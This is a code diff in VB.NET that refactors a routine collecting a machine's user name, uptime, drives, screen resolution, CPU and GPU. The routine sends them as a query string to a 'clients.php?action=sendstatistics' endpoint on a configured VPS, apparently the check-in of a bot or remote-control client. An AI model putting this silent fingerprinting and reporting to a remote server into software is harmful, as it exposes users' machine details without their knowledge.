@@ -41,36 +41,45 @@ Module IndependantActions
     End Sub
 
     Public Sub GetStatistics(ByRef mainWebClient As WebClient)
-        Dim query As New System.Management.SelectQuery("Win32_VideoController")
-        Dim search As New System.Management.ManagementObjectSearcher(query)
-        Dim info As System.Management.ManagementObject
-        Dim cpus = GetObject("WinMgmts:").instancesof("Win32_Processor")
-        Dim cpu As String
-        Dim gpu As String
-        Dim hdds As String
-        Dim architecture As String = "32 Bits"
-        MsgBox("cc")
+        Dim query As New SelectQuery("Win32_VideoController")
+        Dim search As New ManagementObjectSearcher(query)
 
-        Dim vpsurl As String = My.Settings.vpsurl
-        Dim totalinitialisation As String = My.Settings.stats_total_initialisation
-        Dim totalinstruction As String = My.Settings.stats_total_instruction
-        Dim totaluptime As String = My.Settings.stats_total_uptime
-        Dim pcName As String = Environment.UserName
-        Dim PCupTime As String = GetTickCount& / 1000
-        Dim driveslist = DriveInfo.GetDrives()
-        Dim resolution As String = My.Computer.Screen.Bounds.Size.Width & "x" & My.Computer.Screen.Bounds.Size.Height
+        Dim cpu As String = "", gpu As String = "", hddList As String = ""
+        Dim architecture As String = "32 Bits"
+
+        For Each d In DriveInfo.GetDrives()
+            hddList &= d.Name & ": " & d.VolumeLabel & "; "
+        Next
+
+        ' TODO: Not sure if whether or not we should use a loop,
+        ' if it's only to set the variables to the last value of the iterated array. |
+        '                                                                            V
+
         For Each g In search.Get()
             gpu = g("Caption").ToString
         Next
-        For Each d In driveslist
-            hdds += d.Name & " ; " & d.VolumeLabel
+
+        For Each c In GetObject("WinMgmts:").InstancesOf("Win32_Processor")
+            cpu = c.Name.ToString + " " + c.CurrentClockSpeed.ToString + " Mhz"
         Next
-        For Each c In cpus
-            cpu = (c.Name.ToString + " " + c.CurrentClockSpeed.ToString + " Mhz")
-        Next
+
+
         If Environment.Is64BitOperatingSystem Then architecture = "64 Bits"
-        Dim totaldata As String = vpsurl & "|" & totalinitialisation & "|" & totalinstruction & "|" & totaluptime & "|" & pcName & "|" & PCupTime & "|" & hdds & "|" & resolution & "|" & cpu & "|" & gpu
-        Dim client As New WebClient
-        Dim res As String = client.DownloadString(My.Settings.vpsurl & "clients.php?action=sendstatistics&actioncontent=" & totaldata)
+
+        ' TODO: Where is `architecture` ??
+        Dim queryData As String =
+            My.Settings.vpsurl & "|" &
+            My.Settings.stats_total_initialisation & "|" &
+            My.Settings.stats_total_instruction & "|" &
+            My.Settings.stats_total_uptime & "|" &
+            Environment.UserName & "|" & ' PC name
+            GetTickCount / 1000 & "|" &  ' PC up-time
+            hddList & "|" &
+            My.Computer.Screen.Bounds.ToString & "|" & ' Screen Resolution
+            cpu & "|" &
+            gpu
+
+        Dim queryResult As String =
+            New WebClient().DownloadString(My.Settings.vpsurl & "clients.php?action=sendstatistics&actioncontent=" & queryData)
     End Sub
 End Module
